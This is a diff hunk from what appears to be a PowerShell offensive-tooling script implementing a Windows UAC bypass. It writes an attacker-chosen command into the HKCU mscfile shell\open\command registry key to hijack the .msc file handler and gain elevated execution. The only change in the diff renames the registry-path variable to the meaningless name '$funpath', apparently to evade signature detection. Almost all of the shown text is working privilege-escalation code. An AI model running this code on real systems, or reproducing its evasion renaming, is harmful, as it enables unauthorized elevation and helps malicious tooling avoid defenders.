@@ -4629,18 +4629,18 @@ This will write out "Is Elevated: True" to C:\UACBypassTest.
     }
     else{
         #Begin Execution
-        $mscCommandPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
+        $funpath = "HKCU:\Software\Classes\mscfile\shell\open\command"
         $Command = $pshome + '\' + $Command
         #Add in the new registry entries to hijack the msc file
-        if ($Force -or ((Get-ItemProperty -Path $mscCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){
-            New-Item $mscCommandPath -Force |
+        if ($Force -or ((Get-ItemProperty -Path $funpath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){
+            New-Item $funpath -Force |
                 New-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null
         }else{
             Write-Warning "Key already exists, consider using -Force"
             exit
         }
 
-        if (Test-Path $mscCommandPath) {
+        if (Test-Path $funpath) {
             Write-Verbose "Created registry entries to hijack the msc extension"
         }else{
             Write-Warning "Failed to create registry key, exiting"
